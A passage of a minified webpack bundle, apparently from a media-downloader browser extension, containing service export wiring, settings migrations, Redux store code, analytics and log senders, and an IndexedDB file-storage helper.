            __webpack_require__.d(ig_namespaceObject, "startLangObserver", function () {
                return lang_detect_startLangObserver;
            }),
            __webpack_require__.d(ig_namespaceObject, "isServiceUrl", function () {
                return ig_url_checker_isServiceUrl;
            }),
            __webpack_require__.d(ig_namespaceObject, "isServiceMediaUrl", function () {
                return ig_url_checker_isServiceMediaUrl;
            }),
            __webpack_require__.d(ig_namespaceObject, "getMediaId", function () {
                return ig_get_media_id;
            }),
            __webpack_require__.d(ig_namespaceObject, "makeCanonicalUrl", function () {
                return ig_make_canonical_url;
            });
        var services_ok_namespaceObject = {};
        __webpack_require__.r(services_ok_namespaceObject),
            __webpack_require__.d(services_ok_namespaceObject, "appButtonAlign", function () {
                return ok_appButtonAlign;
            }),
            __webpack_require__.d(services_ok_namespaceObject, "Service", function () {
                return ok_service_Service;
            }),
            __webpack_require__.d(services_ok_namespaceObject, "getScrollContainer", function () {
                return service_getScrollContainer;
            }),
            __webpack_require__.d(services_ok_namespaceObject, "Widget", function () {
                return normal;
            }),
            __webpack_require__.d(services_ok_namespaceObject, "downloader", function () {
                return ok_downloader;
            }),
            __webpack_require__.d(services_ok_namespaceObject, "getMediaInfo", function () {
                return ok_get_media_info;
            }),
            __webpack_require__.d(services_ok_namespaceObject, "getLang", function () {
                return ok_generic_lang_detect_getLang;
            }),
            __webpack_require__.d(services_ok_namespaceObject, "startLangObserver", function () {
                return ok_generic_lang_detect_startLangObserver;
            }),
            __webpack_require__.d(services_ok_namespaceObject, "snap", function () {
                return ok_generic_snap;
            }),
            __webpack_require__.d(services_ok_namespaceObject, "isServiceUrl", function () {
                return ok_generic_url_checker_isServiceUrl;
            }),
            __webpack_require__.d(services_ok_namespaceObject, "isServiceMediaUrl", function () {
                return ok_generic_url_checker_isServiceMediaUrl;
            }),
            __webpack_require__.d(services_ok_namespaceObject, "getMediaId", function () {
                return ok_generic_get_media_id;
            }),
            __webpack_require__.d(services_ok_namespaceObject, "makeCanonicalUrl", function () {
                return ok_generic_make_canonical_url;
            });
        var ok_embed_namespaceObject = {};
        __webpack_require__.r(ok_embed_namespaceObject),
            __webpack_require__.d(ok_embed_namespaceObject, "Service", function () {
                return ok_embed_service_Service;
            }),
            __webpack_require__.d(ok_embed_namespaceObject, "Widget", function () {
                return widget_embed;
            }),
            __webpack_require__.d(ok_embed_namespaceObject, "getMediaInfo", function () {
                return ok_embed_get_media_info;
            }),
            __webpack_require__.d(ok_embed_namespaceObject, "downloader", function () {
                return ok_downloader;
            }),
            __webpack_require__.d(ok_embed_namespaceObject, "snap", function () {
                return ok_generic_snap;
            }),
            __webpack_require__.d(ok_embed_namespaceObject, "getLang", function () {
                return ok_generic_lang_detect_getLang;
            }),
            __webpack_require__.d(ok_embed_namespaceObject, "startLangObserver", function () {
                return ok_generic_lang_detect_startLangObserver;
            }),
            __webpack_require__.d(ok_embed_namespaceObject, "getTheme", function () {
                return ok_embed_getTheme;
            }),
            __webpack_require__.d(ok_embed_namespaceObject, "isServiceUrl", function () {
                return ok_embed_generic_url_checker_isServiceUrl;
            }),
            __webpack_require__.d(ok_embed_namespaceObject, "isServiceMediaUrl", function () {
                return ok_embed_generic_url_checker_isServiceMediaUrl;
            }),
            __webpack_require__.d(ok_embed_namespaceObject, "getMediaId", function () {
                return ok_generic_get_media_id;
            }),
            __webpack_require__.d(ok_embed_namespaceObject, "makeCanonicalUrl", function () {
                return ok_generic_make_canonical_url;
            });
        var in_iframe = () => {
                try {
                    return window.self !== window.top;
                } catch (e) {
                    return !0;
                }
            },
            config = __webpack_require__(2),
            eventemitter3 = __webpack_require__(67),
            eventemitter3_default = __webpack_require__.n(eventemitter3);
        const runtime = window.chrome ? window.chrome.runtime : browser.runtime;
        let port,
            currentId = 0;
        console.log(runtime);
        const isContentScript = !runtime.getBackgroundPage;
        isContentScript && (port = runtime.connect());
        const oneTimeListeners = {},
            permanentListeners = {},
            multi = {},
            messagesDispatcher = async (message) => {
                const { id: id, err: err, msg: msg } = message;
                oneTimeListeners[id] &&
                    (err
                        ? oneTimeListeners[id].reject(err)
                        : message.multipleresponse
                        ? (multi[id] || (multi[id] = []), multi[id].push(message.msg), message.end && oneTimeListeners[id].resolve(new Uint8Array([].concat(...multi[id])).buffer))
                        : oneTimeListeners[id].resolve(msg),
                    (!message.multipleresponse || (message.multipleresponse && message.end)) && delete oneTimeListeners[id]);
            },
            subscribesDispatcher = async (message) => {
                const { type: type, msg: msg } = message;
                permanentListeners[type] && permanentListeners[type](msg);
            };
        isContentScript && (port.onMessage.addListener(messagesDispatcher), runtime.onMessage.addListener(subscribesDispatcher));
        const addListener = (event, listener) => {
                permanentListeners[event] = listener;
            },
            sendMessage = (msg) => (
                currentId++,
                new Promise((resolve, reject) => {
                    (oneTimeListeners[currentId] = { resolve: resolve, reject: reject }), port.postMessage({ id: currentId, msg: msg });
                })
            ),
            index_ext_observers = {};
        addListener("globalStorage", (msg) => {
            msg.key in index_ext_observers && index_ext_observers[msg.key](msg.value);
        });
        var index_ext = {
            get: (key) => sendMessage({ type: "get", key: key }),
            set: (key, value) => sendMessage({ type: "set", key: key, value: value }),
            getAllKeys: () => sendMessage({ type: "getAllKeys" }),
            removeItem: (key) => sendMessage({ type: "removeItem", key: key }),
            observe: (key, listener) => {
                index_ext_observers[key] || (index_ext_observers[key] = listener);
            },
        };
        var getRandomValues,
            keys_lang = { name: "lang", ups: [{ v: 1, up: (storage, currentValue) => ("string" != typeof currentValue ? storage.set("lang", "autoDetect") : null) }] },
            rnds8 = new Uint8Array(16);
        function rng() {
            if (
                !getRandomValues &&
                !(getRandomValues =
                    ("undefined" != typeof crypto && crypto.getRandomValues && crypto.getRandomValues.bind(crypto)) ||
                    ("undefined" != typeof msCrypto && "function" == typeof msCrypto.getRandomValues && msCrypto.getRandomValues.bind(msCrypto)))
            )
                throw new Error("crypto.getRandomValues() not supported. See https://github.com/uuidjs/uuid#getrandomvalues-not-supported");
            return getRandomValues(rnds8);
        }
        var regex = /^(?:[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}|00000000-0000-0000-0000-000000000000)$/i;
        for (
            var esm_browser_validate = function (uuid) {
                    return "string" == typeof uuid && regex.test(uuid);
                },
                byteToHex = [],
                stringify_i = 0;
            stringify_i < 256;
            ++stringify_i
        )
            byteToHex.push((stringify_i + 256).toString(16).substr(1));
        var esm_browser_stringify = function (arr) {
            var offset = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0,
                uuid = (
                    byteToHex[arr[offset + 0]] +
                    byteToHex[arr[offset + 1]] +
                    byteToHex[arr[offset + 2]] +
                    byteToHex[arr[offset + 3]] +
                    "-" +
                    byteToHex[arr[offset + 4]] +
                    byteToHex[arr[offset + 5]] +
                    "-" +
                    byteToHex[arr[offset + 6]] +
                    byteToHex[arr[offset + 7]] +
                    "-" +
                    byteToHex[arr[offset + 8]] +
                    byteToHex[arr[offset + 9]] +
                    "-" +
                    byteToHex[arr[offset + 10]] +
                    byteToHex[arr[offset + 11]] +
                    byteToHex[arr[offset + 12]] +
                    byteToHex[arr[offset + 13]] +
                    byteToHex[arr[offset + 14]] +
                    byteToHex[arr[offset + 15]]
                ).toLowerCase();
            if (!esm_browser_validate(uuid)) throw TypeError("Stringified UUID is invalid");
            return uuid;
        };
        const hid_defaultValue = (function (options, buf, offset) {
            var rnds = (options = options || {}).random || (options.rng || rng)();
            if (((rnds[6] = (15 & rnds[6]) | 64), (rnds[8] = (63 & rnds[8]) | 128), buf)) {
                offset = offset || 0;
                for (var i = 0; i < 16; ++i) buf[offset + i] = rnds[i];
                return buf;
            }
            return esm_browser_stringify(rnds);
        })();
        var keys_hid = { name: "hid", ups: [{ v: 1, up: (storage, currentValue) => ("string" != typeof currentValue ? storage.set("hid", hid_defaultValue) : null) }] };
        var keys_utm = {
            name: "utm",
            ups: [
                {
                    v: 1,
                    up: async (storage, currentValue) => {
                        if ("object" != typeof currentValue || null === currentValue || !("utm_term" in currentValue) || !("utm_content" in currentValue)) {
                            let utm;
                            try {
                                utm = await (async () => {
                                    const res = await fetch(config.a.getUtmUrl, { credentials: "include", mode: "cors" });
                                    if (200 === res.status) return res.json();
                                    throw new Error("fetching utm failed");
                                })();
                            } catch (e) {
                                utm = { utm_source: "", utm_medium: "", utm_campaign: "", utm_term: "", utm_content: "" };
                            }
                            storage.set("utm", utm);
                        }
                    },
                },
            ],
        };
        var downloads_count = { name: "downloadsCount", ups: [{ v: 1, up: (storage, currentValue) => ("number" != typeof currentValue ? storage.set("downloadsCount", 0) : null) }] };
        var downloaded_in_row = { name: "downloadedInRow", ups: [{ v: 1, up: (storage, currentValue) => ("number" != typeof currentValue ? storage.set("downloadedInRow", 0) : null) }] };
        var screenshots_count = { name: "screenshotsCount", ups: [{ v: 1, up: (storage, currentValue) => ("number" != typeof currentValue ? storage.set("screenshotsCount", 0) : null) }] };
        var display_qr_codes = { name: "displayQrCodes", ups: [{ v: 1, up: (storage, currentValue) => ("boolean" != typeof currentValue ? storage.set("displayQrCodes", !0) : null) }] };
        var show_formats_available_via_desktop_client = {
            name: "showFormatsAvailableViaDesktopClient",
            ups: [{ v: 1, up: (storage, currentValue) => ("boolean" != typeof currentValue ? storage.set("showFormatsAvailableViaDesktopClient", !0) : null) }],
        };
        var show_formats_required_online_conversion = {
            name: "showFormatsRequiredOnlineConversion",
            ups: [{ v: 1, up: (storage, currentValue) => ("boolean" != typeof currentValue ? storage.set("showFormatsRequiredOnlineConversion", !0) : null) }],
        };
        var show_webm_videos = { name: "showWebmVideos", ups: [{ v: 1, up: (storage, currentValue) => ("boolean" != typeof currentValue ? storage.set("showWebmVideos", !0) : null) }] };
        var warn_before_converting = {
            name: "warnBeforeConverting",
            ups: [
                {
                    v: 1,
                    up: (storage, currentValue) => {
                        "boolean" != typeof currentValue && storage.set("warnBeforeConverting", !0);
                    },
                },
            ],
        };
        var warn_about_competitors_detection = {
            name: "warnAboutCompetitorsDetection",
            ups: [
                {
                    v: 1,
                    up: (storage, currentValue) => {
                        "boolean" != typeof currentValue && storage.set("warnAboutCompetitorsDetection", !0);
                    },
                },
            ],
        };
        var show_snapshot_button = { name: "showSnapshotButton", ups: [{ v: 1, up: (storage, currentValue) => ("boolean" != typeof currentValue ? storage.set("showSnapshotButton", !0) : null) }] };
        var app_button_style = { name: "appButtonStyle", ups: [{ v: 1, up: (storage, currentValue) => ("string" != typeof currentValue ? storage.set("appButtonStyle", "Modern") : null) }] };
        var cache = {
            name: /(gv|ig|ok)_.*/,
            ups: [
                {
                    v: 1,
                    up: (storage, key) => {
                        const value = storage.getItem(key);
                        storage.setItem("cache_" + key, value);
                    },
                },
            ],
        };
        const extension_loaded_defaultValue = Date.now() - 9e7;
        var extension_loaded = { name: "extensionLoaded", ups: [{ v: 1, up: (storage, currentValue) => ("number" != typeof currentValue ? storage.set("extensionLoaded", extension_loaded_defaultValue) : null) }] };
        const extension_installed_stamp_defaultValue = Date.now();
        var extension_installed_stamp = {
            name: "extensionInstalledStamp",
            ups: [{ v: 1, up: (storage, currentValue) => ("number" != typeof currentValue ? storage.set("extensionInstalledStamp", extension_installed_stamp_defaultValue) : null) }],
        };
        const rating_modal_last_check_defaultValue = Date.now();
        var rating_modal_last_check = { name: "ratingModalLastCheck", ups: [{ v: 1, up: (storage, currentValue) => ("number" != typeof currentValue ? storage.set("ratingModalLastCheck", rating_modal_last_check_defaultValue) : null) }] };
        var rating_modal_never_show = { name: "ratingModalNeverShow", ups: [{ v: 1, up: (storage, currentValue) => ("boolean" != typeof currentValue ? storage.set("ratingModalNeverShow", !1) : null) }] };
        var rating_modal_last_not_now = { name: "ratingModalLastNotNow", ups: [{ v: 1, up: (storage, currentValue) => ("number" != typeof currentValue ? storage.set("ratingModalLastNotNow", 0) : null) }] };
        const stats_defaultValue = {
            gv: { download: { mb: 0.1, seconds: 1 }, "webm->mp4": { download: 8, converting: 2 }, "mp4->mp4": { download: 8, converting: 2 }, "mp4->mp3": { download: 2, converting: 3 } },
            gvEmbed: { download: { mb: 0.1, seconds: 1 }, "webm->mp4": { download: 8, converting: 2 }, "mp4->mp4": { download: 8, converting: 2 }, "mp4->mp3": { download: 2, converting: 3 } },
            gvOk: { download: { mb: 0.1, seconds: 1 }, "webm->mp4": { download: 8, converting: 2 }, "mp4->mp4": { download: 8, converting: 2 }, "mp4->mp3": { download: 2, converting: 3 } },
            ok: { download: { mb: 0.1, seconds: 1 }, "mp4->mp3": { download: 2, converting: 3 } },
            okEmbed: { download: { mb: 0.1, seconds: 1 }, "mp4->mp3": { download: 2, converting: 3 } },
            ig: { download: { mb: 0.01, seconds: 1 }, "webm->mp4": { download: 8, converting: 2 }, "mp4->mp4": { download: 8, converting: 2 }, "mp4->mp3": { download: 2, converting: 3 } },
        };
        var keys_stats = {
            name: "stats",
            ups: [
                { v: 1, up: (storage, currentValue) => ("object" != typeof currentValue || null === currentValue ? storage.set("stats", stats_defaultValue) : null) },
                {
                    v: 2,
                    up: (storage, currentValue) => {
                        currentValue && storage.set("stats", { ...currentValue, gvOk: stats_defaultValue.gvOk });
                    },
                },
            ],
        };
        var install_reported = {
            name: "installReported",
            ups: [
                {
                    v: 1,
                    up: (storage, currentValue) => {
                        "boolean" != typeof currentValue && storage.set("installReported", !1);
                    },
                },
            ],
        };
        const black_list_defaultValue = [];
        var black_list = { name: "blackList", ups: [{ v: 1, up: (storage, currentValue) => (Array.isArray(currentValue) ? null : storage.set("blackList", black_list_defaultValue)) }] };
        const day = 864e5,
            black_list_last_updated_defaultValue = Date.now() - day;
        var all_migrations = [
            keys_hid,
            keys_utm,
            keys_lang,
            downloads_count,
            downloaded_in_row,
            screenshots_count,
            display_qr_codes,
            show_formats_available_via_desktop_client,
            show_formats_required_online_conversion,
            show_webm_videos,
            warn_before_converting,
            warn_about_competitors_detection,
            show_snapshot_button,
            app_button_style,
            cache,
            extension_loaded,
            extension_installed_stamp,
            keys_stats,
            install_reported,
            rating_modal_last_check,
            rating_modal_never_show,
            rating_modal_last_not_now,
            black_list,
            { name: "blackListLastUpdated", ups: [{ v: 1, up: (storage, currentValue) => ("number" != typeof currentValue ? storage.set("blackListLastUpdated", black_list_last_updated_defaultValue) : null) }] },
        ];
        let singleton = null;
        const runMigrations = async () => {
            console.log("START MIGRATIONS!!!");
            let appliedMigrations = await index_ext.get("appliedMigrations");
            console.log("MIGRATIONS!!! applied: ", appliedMigrations), appliedMigrations || (appliedMigrations = {});
            const appliedThisTime = await (async (migrations, appliedMigrations) => {
                const keys = migrations.map((migration) => migration.name),
                    appliedThisTime = {};
                for (const name of keys) {
                    let migrationsToApply;
                    (migrationsToApply =
                        name.toString() in appliedMigrations
                            ? migrations.find((migration) => migration.name === name).ups.filter((migration) => migration.v > appliedMigrations[name])
                            : migrations.find((migration) => migration.name === name).ups),
                        migrationsToApply.sort((migration1, migration2) => migration2.v - migration1.v);
                    for (const migration of migrationsToApply)
                        if (migration.up && ("string" == typeof name && (await migration.up(index_ext, await index_ext.get(name)), (appliedThisTime[name] = migration.v)), name instanceof RegExp)) {
                            const allKeys = await index_ext.getAllKeys();
                            await Promise.all(
                                allKeys.map(async (storageKey) => {
                                    name.test(storageKey) && (await migration.up(index_ext, storageKey));
                                })
                            ),
                                (appliedThisTime[name.toString()] = migration.v);
                        }
                }
                return appliedThisTime;
            })(all_migrations, appliedMigrations);
            console.log("MIGRATIONS!!! applied this time: ", appliedThisTime), index_ext.set("appliedMigrations", { ...appliedMigrations, ...appliedThisTime });
        };
        var src_migrations = () => singleton || ((singleton = runMigrations()), singleton),
            es = __webpack_require__(68),
            randomString = function () {
                return Math.random().toString(36).substring(7).split("").join(".");
            },
            ActionTypes = {
                INIT: "@@redux/INIT" + randomString(),
                REPLACE: "@@redux/REPLACE" + randomString(),
                PROBE_UNKNOWN_ACTION: function () {
                    return "@@redux/PROBE_UNKNOWN_ACTION" + randomString();
                },
            };
        function isPlainObject(obj) {
            if ("object" != typeof obj || null === obj) return !1;
            for (var proto = obj; null !== Object.getPrototypeOf(proto); ) proto = Object.getPrototypeOf(proto);
            return Object.getPrototypeOf(obj) === proto;
        }
        function createStore(reducer, preloadedState, enhancer) {
            var _ref2;
            if (("function" == typeof preloadedState && "function" == typeof enhancer) || ("function" == typeof enhancer && "function" == typeof arguments[3]))
                throw new Error("It looks like you are passing several store enhancers to createStore(). This is not supported. Instead, compose them together to a single function.");
            if (("function" == typeof preloadedState && void 0 === enhancer && ((enhancer = preloadedState), (preloadedState = void 0)), void 0 !== enhancer)) {
                if ("function" != typeof enhancer) throw new Error("Expected the enhancer to be a function.");
                return enhancer(createStore)(reducer, preloadedState);
            }
            if ("function" != typeof reducer) throw new Error("Expected the reducer to be a function.");
            var currentReducer = reducer,
                currentState = preloadedState,
                currentListeners = [],
                nextListeners = currentListeners,
                isDispatching = !1;
            function ensureCanMutateNextListeners() {
                nextListeners === currentListeners && (nextListeners = currentListeners.slice());
            }
            function getState() {
                if (isDispatching)
                    throw new Error("You may not call store.getState() while the reducer is executing. The reducer has already received the state as an argument. Pass it down from the top reducer instead of reading it from the store.");
                return currentState;
            }
            function subscribe(listener) {
                if ("function" != typeof listener) throw new Error("Expected the listener to be a function.");
                if (isDispatching)
                    throw new Error(
                        "You may not call store.subscribe() while the reducer is executing. If you would like to be notified after the store has been updated, subscribe from a component and invoke store.getState() in the callback to access the latest state. See https://redux.js.org/api-reference/store#subscribelistener for more details."
                    );
                var isSubscribed = !0;
                return (
                    ensureCanMutateNextListeners(),
                    nextListeners.push(listener),
                    function () {
                        if (isSubscribed) {
                            if (isDispatching) throw new Error("You may not unsubscribe from a store listener while the reducer is executing. See https://redux.js.org/api-reference/store#subscribelistener for more details.");
                            (isSubscribed = !1), ensureCanMutateNextListeners();
                            var index = nextListeners.indexOf(listener);
                            nextListeners.splice(index, 1), (currentListeners = null);
                        }
                    }
                );
            }
            function dispatch(action) {
                if (!isPlainObject(action)) throw new Error("Actions must be plain objects. Use custom middleware for async actions.");
                if (void 0 === action.type) throw new Error('Actions may not have an undefined "type" property. Have you misspelled a constant?');
                if (isDispatching) throw new Error("Reducers may not dispatch actions.");
                try {
                    (isDispatching = !0), (currentState = currentReducer(currentState, action));
                } finally {
                    isDispatching = !1;
                }
                for (var listeners = (currentListeners = nextListeners), i = 0; i < listeners.length; i++) {
                    (0, listeners[i])();
                }
                return action;
            }
            function replaceReducer(nextReducer) {
                if ("function" != typeof nextReducer) throw new Error("Expected the nextReducer to be a function.");
                (currentReducer = nextReducer), dispatch({ type: ActionTypes.REPLACE });
            }
            function observable() {
                var _ref,
                    outerSubscribe = subscribe;
                return (
                    ((_ref = {
                        subscribe: function (observer) {
                            if ("object" != typeof observer || null === observer) throw new TypeError("Expected the observer to be an object.");
                            function observeState() {
                                observer.next && observer.next(getState());
                            }
                            return observeState(), { unsubscribe: outerSubscribe(observeState) };
                        },
                    })[es.a] = function () {
                        return this;
                    }),
                    _ref
                );
            }
            return dispatch({ type: ActionTypes.INIT }), ((_ref2 = { dispatch: dispatch, subscribe: subscribe, getState: getState, replaceReducer: replaceReducer })[es.a] = observable), _ref2;
        }
        function bindActionCreator(actionCreator, dispatch) {
            return function () {
                return dispatch(actionCreator.apply(this, arguments));
            };
        }
        function _defineProperty(obj, key, value) {
            return key in obj ? Object.defineProperty(obj, key, { value: value, enumerable: !0, configurable: !0, writable: !0 }) : (obj[key] = value), obj;
        }
        function redux_ownKeys(object, enumerableOnly) {
            var keys = Object.keys(object);
            return (
                Object.getOwnPropertySymbols && keys.push.apply(keys, Object.getOwnPropertySymbols(object)),
                enumerableOnly &&
                    (keys = keys.filter(function (sym) {
                        return Object.getOwnPropertyDescriptor(object, sym).enumerable;
                    })),
                keys
            );
        }
        function _objectSpread2(target) {
            for (var i = 1; i < arguments.length; i++) {
                var source = null != arguments[i] ? arguments[i] : {};
                i % 2
                    ? redux_ownKeys(source, !0).forEach(function (key) {
                          _defineProperty(target, key, source[key]);
                      })
                    : Object.getOwnPropertyDescriptors
                    ? Object.defineProperties(target, Object.getOwnPropertyDescriptors(source))
                    : redux_ownKeys(source).forEach(function (key) {
                          Object.defineProperty(target, key, Object.getOwnPropertyDescriptor(source, key));
                      });
            }
            return target;
        }
        function compose() {
            for (var _len = arguments.length, funcs = new Array(_len), _key = 0; _key < _len; _key++) funcs[_key] = arguments[_key];
            return 0 === funcs.length
                ? function (arg) {
                      return arg;
                  }
                : 1 === funcs.length
                ? funcs[0]
                : funcs.reduce(function (a, b) {
                      return function () {
                          return a(b.apply(void 0, arguments));
                      };
                  });
        }
        function createThunkMiddleware(extraArgument) {
            return function (_ref) {
                var dispatch = _ref.dispatch,
                    getState = _ref.getState;
                return function (next) {
                    return function (action) {
                        return "function" == typeof action ? action(dispatch, getState, extraArgument) : next(action);
                    };
                };
            };
        }
        var thunk = createThunkMiddleware();
        thunk.withExtraArgument = createThunkMiddleware;
        var redux_thunk_es = thunk,
            xhr = __webpack_require__(16);
        const getContent = async (url, timeout) => await sendMessage({ type: "getContent", url: url, timeout: timeout }),
            fetchBack = (url, options, responseContentType) => sendMessage({ type: "fetchBack", url: url, options: options, responseContentType: responseContentType }),
            network_getHeaders = (url, headers, back) => (back ? ((url, headers) => sendMessage({ type: "getHeaders", url: url, headers: headers }))(url, headers) : Object(xhr.b)(url, headers)),
            makeGetContent = (back) => (back ? getContent : xhr.a),
            network_sendPost = (url, headers, body, back) => (back ? ((url, headers, body) => sendMessage({ type: "sendPost", url: url, headers: headers, body: body }))(url, headers, body) : Object(xhr.c)(url, headers, body)),
            getContentLength = async (url, back) => {
                const [contentLengthStr] = await network_getHeaders(url, ["Content-Length"], back);
                return parseInt(contentLengthStr, 10);
            };
        var get_send_event = (store) => async (data) => {
            const { serviceName: serviceName, defaultItem: defaultItem, hid: hid, utm: utm } = store.getState(),
                defData = {
                    version: config.a.version,
                    type: config.a.analyticsType,
                    project: config.a.type,
                    branch: config.a.branch,
                    hid: hid,
                    hash: config.a.hash,
                    ...utm,
                    service: serviceName,
                    media_source: window.location.href,
                    format: defaultItem ? defaultItem.quality : "",
                };
            try {
                const headers = [["Content-Type", "application/json; charset=utf-8"]],
                    body = JSON.stringify({ ...defData, ...data });
                network_sendPost(config.a.analyticsUrl, headers, body, !0);
            } catch (e) {}
        };
        var get_os = () =>
            -1 !== window.navigator.userAgent.indexOf("Windows")
                ? "windows"
                : -1 !== window.navigator.userAgent.indexOf("Mac")
                ? "mac-ios"
                : -1 !== window.navigator.userAgent.indexOf("X11")
                ? "unix"
                : -1 !== window.navigator.userAgent.indexOf("Linux")
                ? "linux"
                : "unknown";
        var get_browser = () => {
                if ((window.opr && opr.addons) || window.opera || navigator.userAgent.indexOf(" OPR/") >= 0) return "opera";
                if ("undefined" != typeof InstallTrigger) return "firefox";
                if (/constructor/i.test(window.HTMLElement) || "[object SafariRemoteNotification]" === (!window.safari || ("undefined" != typeof safari && window.safari.pushNotification)).toString()) return "safari";
                const isChrome = !(!window.chrome || (!window.chrome.webstore && !window.chrome.runtime));
                return isChrome && -1 !== navigator.userAgent.indexOf("Edg") ? "edge" : isChrome ? "chrome" : "unknown";
            },
            add_utm = __webpack_require__(18);
        const isRestrictedLogType = (log) => {
                const { options: options } = log;
                return !!options;
            },
            checkIfSended = async (data, throttle) => {
                const logsSent = (await index_ext.get("logsSent")) || [],
                    mediaSource = window.location.href,
                    dataType = data.type,
                    date = Date.now();
                return logsSent.some((log) => !isRestrictedLogType(log) && log.mediaSource === mediaSource && log.dataType === dataType && !(date - log.date < throttle));
            };
        var get_send_log = (store) => async (data, options) => {
            const dataType = data.type;
            dataType
                ? ((await (async (data, options) => {
                      let decision;
                      if (options) {
                          const { throttle: throttle, probability: probability } = options;
                          if (probability) {
                              decision = Math.random() <= probability;
                          } else throttle && (decision = await checkIfSended(data, throttle));
                      } else decision = await checkIfSended(data, 216e5);
                      return decision;
                  })(data, options))
                      ? ((data, store) => {
                            const { hid: hid, utm: utm } = store.getState(),
                                { branch: branch, hash: hash, logsUrl: logsUrl, type: type, version: version } = config.a,
                                mediaSource = window.location.href,
                                { userAgent: userAgent } = navigator,
                                defData = { mediaSource: mediaSource, userAgent: userAgent };
                            console.log("SendLog ->", { ...defData, ...data });
                            let url = logsUrl + "?project=down&type=ext";
                            (url += `&ext_type=${type}&branch=${encodeURIComponent(branch)}&version=${version}&hash=${hash}`), (url += `&hid=${hid}&browser=${get_browser()}&os=${get_os()}`), (url = Object(add_utm.a)(url, utm));
                            try {
                                const headers = [["Content-Type", "text/plain"]],
                                    body = JSON.stringify({ ...defData, ...data });
                                network_sendPost(url, headers, body, !0);
                            } catch (e) {}
                        })(data, store)
                      : data && !data.probability && console.log(`SendLog: "${dataType}" has already sent recently`),
                  ((data, options) => !options || !options.probability)(0, options) &&
                      (async (data, options) => {
                          const dataType = data.type,
                              logsSent = (await index_ext.get("logsSent")) || [],
                              date = Date.now(),
                              mediaSource = window.location.href,
                              updatedLogs = logsSent.filter((log) => {
                                  if (isRestrictedLogType(log)) {
                                      if (log.dataType !== dataType) return !0;
                                      const { throttle: throttle } = options;
                                      if (throttle) return date - log.date < throttle;
                                  } else if (date - log.date < 216e5) return log.mediaSource === mediaSource && log.dataType === dataType;
                                  return !1;
                              });
                          updatedLogs.push({ date: date, mediaSource: mediaSource, dataType: dataType, options: options }), index_ext.set("logsSent", updatedLogs);
                      })(data, options))
                : console.error("LOGS wrong data: type field is required");
        };
        var get_platform = () => {
            let platform = "";
            const desc = window.navigator.platform.toLowerCase();
            return /^mac.*/.test(desc) && (platform = "macOS"), /^win.*/.test(desc) && (platform = "windows"), /^linux.*/.test(desc) && (platform = "linux"), platform;
        };
        var get_content_limit = async () => {
            const platform = get_platform(),
                freeMemorySize = window.performance && window.performance.memory ? window.performance.memory.jsHeapSizeLimit - window.performance.memory.usedJSHeapSize : null,
                freeMemory = Math.min(2040109465.6, freeMemorySize || 2040109465.6);
            let limit = 0;
            switch (platform) {
                case "macOS":
                case "linux":
                    limit = 0.75 * freeMemory;
                    break;
                case "windows":
                    (limit = 0.08 * freeMemory), (limit = limit < 1610612736 ? limit : 1610612736);
                    break;
                default:
                    limit = 0.5 * freeMemory;
            }
            const storage = navigator.storage ? await navigator.storage.estimate() : null;
            return storage ? Math.min(limit, storage.quota - storage.usage) : limit;
        };
        let saving = !1;
        var save_file = (url, filename) => {
            if (!saving) {
                saving = !0;
                const a = document.createElement("a");
                if (
                    ((a.href = url),
                    (a.download = filename),
                    console.log(document.createElement),
                    (a.addEventListener = function (event, listener) {
                        console.log("FAKE!!!", event, listener);
                    }),
                    document.createEvent)
                ) {
                    const event = document.createEvent("MouseEvents");
                    event.initEvent("click", !0, !0), a.dispatchEvent(event);
                } else a.click();
                saving = !1;
            }
        };
        var idbfs = function () {
                return {
                    indexedDB() {
                        if (void 0 !== window.indexedDB) return window.indexedDB;
                        let ret = null;
                        return "object" == typeof window && (ret = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB), ret;
                    },
                    DB_VERSION: 22,
                    DB_STORE_NAME: "FILE_DATA",
                    dbs: {},
                    blobs: [0],
                    fileStore: null,
                    getDB(name, callback) {
                        let db = this.dbs[name];
                        if (db) callback(null, db);
                        else {
                            let req;
                            try {
                                (req = this.indexedDB().open(name, this.DB_VERSION)),
                                    (req.onupgradeneeded = (e) => {
                                        db = e.target.result;
                                        const { transaction: transaction } = e.target;
                                        db.objectStoreNames.contains(this.DB_STORE_NAME) ? (this.fileStore = transaction.objectStore(this.DB_STORE_NAME)) : (this.fileStore = db.createObjectStore(this.DB_STORE_NAME));
                                    }),
                                    (req.onsuccess = () => {
                                        (db = req.result), (this.dbs[name] = db), callback(null, db);
                                    }),
                                    (req.onerror = (e) => {
                                        callback(this.error), e.preventDefault();
                                    });
                            } catch (e) {
                                callback(e);
                            }
                        }
                    },
                    getStore(dbName, type, callback) {
                        this.getDB(dbName, (error, db) => {
                            if (error) callback(error);
                            else {
                                const transaction = db.transaction([this.DB_STORE_NAME], type);
                                transaction.onerror = (e) => {
                                    callback(this.error || "unknown error"), e.preventDefault();
                                };
                                const store = transaction.objectStore(this.DB_STORE_NAME);
                                callback(null, store);
                            }
                        });
                    },
                    readFile(id) {
                        return new Promise((resolve, reject) => {
                            this.getStore(this.DB_STORE_NAME, "readonly", (err, store) => {
                                if (err) reject(err);
                                else {
                                    const req = store.get(id);
                                    (req.onsuccess = (event) => {
                                        const { result: result } = event.target;
                                        result ? resolve(result) : reject(new Error(`file ${id} not found`));
                                    }),
                                        (req.onerror = (error) => {
                                            reject(error);
                                        });
                                }
                            });
                        });
                    },
                    writeFile(id, data) {
                        return new Promise((resolve, reject) => {
                            this.getStore(this.DB_STORE_NAME, "readwrite", (err, store) => {
                                if (err) reject(err);
                                else {
                                    const req = store.put(data, id);
                                    (req.onsuccess = () => {
                                        resolve();
                                    }),
                                        (req.onerror = (error) => {
                                            reject(error);
                                        });
                                }
                            });
                        });
                    },
                    deleteFile(id) {
                        return new Promise((resolve, reject) => {
                            this.getStore(this.DB_STORE_NAME, "readwrite", (err, store) => {
                                if (err) reject(err);
                                else {
                                    const req = store.delete(id);
                                    (req.onsuccess = () => {
                                        resolve();
                                    }),
                                        (req.onerror = (error) => {
                                            reject(error);
                                        });
                                }
                            });
                        });
                    },
                    existsFile(id) {
                        return new Promise((resolve, reject) => {
                            this.getStore(this.DB_STORE_NAME, "readonly", (err, store) => {
                                if (err) reject(err);
                                else {
                                    const req = store.count(id);
                                    (req.onsuccess = (event) => {
                                        resolve(event.target.result > 0);
                                    }),
                                        (req.onerror = (error) => {
                                            reject(error);
                                        });
                                }
                            });
                        });
                    },
